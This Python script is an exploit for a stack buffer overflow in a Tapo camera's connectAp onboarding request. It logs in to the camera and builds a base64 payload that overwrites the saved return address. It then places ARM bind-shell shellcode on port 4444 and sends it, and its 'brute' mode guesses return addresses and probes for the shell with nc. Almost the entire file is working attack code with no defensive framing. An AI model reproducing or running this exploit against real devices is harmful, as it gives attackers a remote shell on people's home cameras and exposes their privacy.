#!/usr/bin/env python3
"""Build and send the Tapo `connectAp` overflow payload.

The decode target is a fixed stack buffer; `--offset` is the distance from the buffer start to the
saved return address. Bytes after the offset are the shellcode (bind shell on 4444).

  ./tapo_connectap_sc.py build --offset 0x120 [--out payload.b64]
  ./tapo_connectap_sc.py send  --host 192.168.4.70 --offset 0x120

Assembly lives next to this file as `tapo_bind4444.S`; it is assembled with arm-none-eabi-as and
checked for size. Everything is verified under qemu-arm before sending.
"""
import argparse
import base64
import hashlib
import json
import os
import random
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ASM = os.path.join(HERE, "tapo_bind4444.S")


def build_shellcode():
    with tempfile.TemporaryDirectory() as td:
        o = os.path.join(td, "sc.o")
        b = os.path.join(td, "sc.bin")
        subprocess.run(["arm-none-eabi-as", "-o", o, ASM], check=True)
        subprocess.run(["arm-none-eabi-objcopy", "-O", "binary", o, b], check=True)
        return open(b, "rb").read()


SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)


def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b""):
    """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode."""
    sc = build_shellcode()
    pre = prefix + b"\x00" if prefix else b""
    filler = pre + bytes(random.getrandbits(8) for _ in range(max(0, offset - len(pre))))
    val = marker if marker is not None else addr
    pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
    return base64.b64encode(filler + pc + SLED * (sled // 4) + sc).decode()


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def post(host, path, body, hdrs=None, timeout=6):
    h = ["-H", "Content-Type: application/json", "-H", "User-Agent: Tapo CameraClient Android"]
    for k, v in (hdrs or {}).items():
        h += ["-H", "%s: %s" % (k, v)]
    p = subprocess.run(["curl", "-sk", "-m", str(timeout), *h, "-X", "POST", "-d", json.dumps(body),
                        "https://%s%s" % (host, path)], capture_output=True, text=True)
    return p.stdout


def login(host, tries=90):
    for i in range(tries):
        try:
            j = json.loads(post(host, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3))
        except Exception:
            time.sleep(2)
            continue
        d = (j.get("result") or {}).get("data") or {}
        if not d.get("device_confirm"):
            time.sleep(2)
            continue
        dc, nonce = d["device_confirm"], d["nonce"]
        try:
            j2 = json.loads(post(host, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "digest_passwd": dc, "username": "admin"}}, timeout=3))
        except Exception:
            time.sleep(2)
            continue
        if j2.get("error_code") == 0:
            hk = dc[:64]
            print("login ok (%d tries)" % i)
            return {"stok": j2["result"]["stok"], "seq": j2["result"]["start_seq"],
                    "lsk": sha("lsk" + nonce + hk)[:32], "ivb": sha("ivb" + nonce + hk)[:32]}
        time.sleep(2)
    raise SystemExit("camera never woke")


def req(host, sess, inner, timeout=8):
    body = {"method": "multipleRequest", "params": {"requests": [inner]}}
    r = post(host, "/stok=%s/ds" % sess["stok"], body, {"seq": str(sess["seq"])}, timeout=timeout)
    sess["seq"] += 1
    try:
        j = json.loads(r)
    except Exception:
        return {"raw": r[:200]}
    if isinstance(j.get("result"), dict) and "response" in j["result"]:
        pt = subprocess.run(["openssl", "enc", "-d", "-aes-128-cbc", "-K", sess["lsk"], "-iv", sess["ivb"]],
                            input=base64.b64decode(j["result"]["response"]), capture_output=True).stdout
        try:
            return json.loads(pt)
        except Exception:
            return {"plain": pt[:200]}
    return j


def connect_params(b64: str, ssid: str, bssid: str) -> dict:
    """The only shape that reaches the decode: the connect object directly.

    `params.onboarding.connect` is rejected with -40209 on 1.2.2/1.1.7; the
    connect object must be `params` itself. `pwd_encrypted` is what selects the
    decode, `unique_key` must be an Integer, and rssi/band are part of the model.
    """
    return {"onboarding": {"connect": {
        "ssid": ssid, "bssid": bssid, "auth": 1, "encryption": 3, "rssi": -50,
        "password": b64, "unique_key": 0, "band": 0}}}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute"])
    ap.add_argument("--offset", type=lambda x: int(x, 0), default=1060)
    ap.add_argument("--host", default="192.168.6.70")
    ap.add_argument("--ssid", default="Aardvark")
    ap.add_argument("--bssid", default="00:00:00:00:00:00")
    ap.add_argument("--marker", type=lambda x: int(x, 0))
    ap.add_argument("--out", default=None)
    ap.add_argument("--addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--sled", type=int, default=0)
    ap.add_argument("--padpc", type=int, default=1)
    ap.add_argument("--prefix", default="")
    ap.add_argument("--count", type=int, default=40)
    ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
    a = ap.parse_args()

    if a.mode in ("ret2stack", "brute"):
        base = a.addr
        if base is None:
            raise SystemExit("--addr required")
        sess = login(a.host)
        for i in range(a.count if a.mode == "brute" else 1):
            candidate = base + i * a.step
            b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
                        prefix=a.prefix.encode())
            params = connect_params(b64, a.ssid, a.bssid)
            t0 = time.time()
            r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
            ok = "raw" not in r
            print("addr=%#x %s %.2fs" % (candidate, "alive" if ok else "DEAD", time.time() - t0))
            if not ok:
                # probe for the shell
                time.sleep(1)
                p = subprocess.run(["nc", "-z", "-G2", a.host, "4444"], capture_output=True)
                if p.returncode == 0:
                    print("SHELL on %s:4444" % a.host)
                    break
                sess = login(a.host, tries=40)
        return

    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode())
    if a.mode == "build":
        if a.out:
            open(a.out, "w").write(b64)
            print("wrote %s (%d chars, decodes to %d bytes)" % (a.out, len(b64), len(base64.b64decode(b64))))
        else:
            print(b64)
        return

    sess = login(a.host)
    t0 = time.time()
    r = req(a.host, sess, {"method": "connectAp", "params": connect_params(b64, a.ssid, a.bssid)})
    print("%.2fs %s" % (time.time() - t0, json.dumps(r)[:200]))
    print("now: nc %s 4444" % a.host)


if __name__ == "__main__":
    main()
